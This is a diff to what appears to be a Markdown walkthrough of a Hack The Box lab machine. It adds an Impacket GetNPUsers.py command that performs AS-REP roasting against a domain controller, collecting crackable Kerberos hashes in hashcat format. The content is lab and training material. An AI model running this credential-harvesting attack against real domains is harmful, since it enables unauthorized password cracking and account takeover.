@@ -33,7 +33,7 @@
 
 2. Nmap reveals we're dealing with a Domain Controller. Since we are not given initial credentials, attempt to get hashes via ASREProasting attack using Impacket's GetNPUsers.py script
 
-``
+`GetNPUsers.py -request -format hashcat -outputfile asreproastables.txt -dc-ip 10.129.95.210 'htb.local/'`
 
 <img width="716" height="135" alt="image" src="https://github.com/user-attachments/assets/9fd9a708-21f9-4930-9193-b8579aa8a195" />
 
